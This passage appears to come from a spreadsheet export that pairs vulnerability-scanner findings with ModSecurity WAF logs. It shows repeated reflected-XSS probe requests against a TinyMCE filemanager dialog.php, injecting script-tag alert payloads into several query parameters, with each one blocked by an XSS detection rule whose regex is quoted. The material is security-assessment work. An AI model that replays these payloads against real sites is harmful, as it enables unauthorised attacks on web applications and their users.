</td><td class=xl24 width=64 >2015-04-01 09:28:38</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:37 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(215099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts7awQAW0AAHzDqsQAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts7awQAW0AAHzDqsQAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366882</td><td class=xl24 width=64 >2015-03-31 21:30:59</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(876099)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=eph7nvjuka767fp453i8qvoph2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:40</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:38 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(876099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts7qwQAW0AAHewA9QAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts7qwQAW0AAHewA9QAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366883</td><td class=xl24 width=64 >2015-03-31 21:31:33</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(677399)&lt;/script&gt;&lt;!--&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28677399%29%2F; PHPSESSID=qfbcl2napvqhnns2ge90ru3du2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:41</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:40 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(677399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts8KwQAW0AABvT@HAAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts8KwQAW0AABvT@HAAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366884</td><td class=xl24 width=64 >2015-03-31 21:32:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(171799)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=up4r9d4jetvco0rdo6ql2uec15
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:42</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:41 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(171799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts8awQAW0AAHhB77gAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts8awQAW0AAHhB77gAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366885</td><td class=xl24 width=64 >2015-03-31 21:33:17</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(959699)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=vb5kukorcm8ni087nra479s9b3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:43</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:42 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(959699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts8qwQAW0AAD9hYOAAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts8qwQAW0AAD9hYOAAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366886</td><td class=xl24 width=64 >2015-03-31 21:34:28</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(817199)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ge4c3h9b7s3qhobdnt0turglm6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:45</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:43 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(817199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts86wQAW0AABt@bV8AAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts86wQAW0AABt@bV8AAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366887</td><td class=xl24 width=64 >2015-03-31 21:35:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac26aa50f8</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=&quot;&gt;&lt;script&gt;alert(681299)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=hoegjtoj10gpej8ctcd86ur7n5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:46</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:45 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac26aa50f8. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(681299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts9awQAW0AAHchlVcAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts9awQAW0AAHchlVcAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366888</td><td class=xl24 width=64 >2015-03-31 21:36:12</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(809199)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=2s565fh4mh0fdggrkpu9d38kp3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:47</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:46 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(809199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts9qwQAW0AAHgzv0kAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts9qwQAW0AAHgzv0kAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366889</td><td class=xl24 width=64 >2015-03-31 21:37:56</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site 